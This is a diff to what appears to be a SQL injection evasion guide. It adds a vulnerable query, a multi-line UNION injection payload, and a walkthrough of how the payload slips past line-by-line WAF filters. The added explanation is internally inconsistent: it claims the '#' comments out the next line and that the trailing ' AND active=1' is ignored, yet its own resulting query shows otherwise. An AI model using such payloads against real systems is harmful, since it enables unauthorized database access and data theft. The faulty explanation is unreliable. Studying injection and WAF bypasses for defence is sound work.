@@ -232,12 +232,21 @@ UNION attacks can be obfuscated:
 Using newlines within comment sequences to bypass pattern matching:
 
 ```sql
+-- Vulnerable query:
+SELECT * FROM users WHERE id='[INPUT]' AND active=1
+
+-- Injection payload (multi-line):
 1'#
 AND 0--
 UNION SELECT 1,2,3
+
+-- Resulting query (as MySQL sees it):
+SELECT * FROM users WHERE id='1'#
+AND 0--
+UNION SELECT 1,2,3' AND active=1
 ```
 
-This breaks up the payload across multiple lines, evading single-line pattern matching.
+The `#` comments out the rest of line 1, `AND 0--` is commented out by the preceding `#`, and `UNION SELECT` executes. The trailing `' AND active=1` becomes part of the commented/ignored portion. This breaks up the payload across multiple lines, evading single-line pattern matching by WAFs that scan line-by-line.
 
 ### Keyword Bypass Techniques
 
